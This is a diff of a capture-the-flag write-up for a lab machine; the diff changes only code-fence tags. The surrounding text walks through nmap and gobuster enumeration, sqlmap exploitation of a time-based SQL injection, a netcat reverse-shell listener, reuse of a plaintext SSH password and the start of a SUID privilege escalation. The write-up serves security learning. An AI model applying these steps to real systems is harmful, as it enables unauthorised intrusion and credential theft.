@@ -1,7 +1,7 @@
 ``IP: 10.10.131.235``
 
 ### Using Nmap to enumerate ports and services:
-```
+```r
 nmap -sV -sC -A 10.10.131.235    
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-11 22:37 EST
 Nmap scan report for 10.10.131.235
@@ -62,7 +62,7 @@ Found: ``Vulnerable FTP Server, SSH Open, DNS Service, A web server on port 1337
 
 ### Enumerating the Webserver:
 ``Gobuster``
-```
+```r
 gobuster dir -u http://10.10.131.235:1337 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  ~ gobuster dir -u http://10.10.131.235:1337 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 
@@ -118,7 +118,7 @@ run: ``sqlmap -r ~/Desktop/request``
 - You will notice that it includes that the email parameter is vulnerable to ``time-based sql injection``
 - From the results of the sqlmap, I also noticed it dumped a number of databases:
 
-```
+```r
 expose
 phpmyadmin
 sys
@@ -210,7 +210,7 @@ Lets Setup a netcat listener and navigate to the file that we uploaded.
 
 Looking at the netcat listener we can see that we got a shell.
 
-```
+```s
 ~ nc -nvlp 4444
 listening on [any] 4444 ...
 connect to [10.6.42.185] from (UNKNOWN) [10.10.222.102] 42422
@@ -238,7 +238,7 @@ cat: flag.txt: Permission denied
 
 After gaining into the machine, we see we can get into the zeamkish directory. We don't have permission. How about the ssh_creds.txt. Let us find out
 
-```
+```r
 $ cat ssh_creds.txt
 SSH CREDS
 zeamkish
@@ -248,7 +248,7 @@ That would be a password: ``easytohack@123``
 Let's try and use that and login into zeamkish account
 
 ``ssh zeamkish@10.10.222.102``
-```
+```r
 zeamkish@ip-10-10-222-102:~$ ls -l
 total 8
 -rw-r----- 1 zeamkish zeamkish 27 Jun  8  2023 flag.txt
@@ -261,7 +261,7 @@ THM{USER_FLAG_1231_EXPOSE}
 
 ### Privilege Escalation:
 From the look of things the user cannot run ``sudo``
-```
+```r
 zeamkish@ip-10-10-222-102:~$ sudo -l
 [sudo] password for zeamkish: 
 Sorry, user zeamkish may not run sudo on ip-10-10-222-102.
@@ -281,7 +281,7 @@ We can use the [**GTFobins**](https://gtfobins.github.io/gtfobins/find/#suid) 
 
 After running the above command we got a root shell.
 
-```
+```r
 zeamkish@ip-10-10-222-102:~$ /usr/bin/sudo cd /root
 [sudo] password for zeamkish: 
 zeamkish is not in the sudoers file.  This incident will be reported.
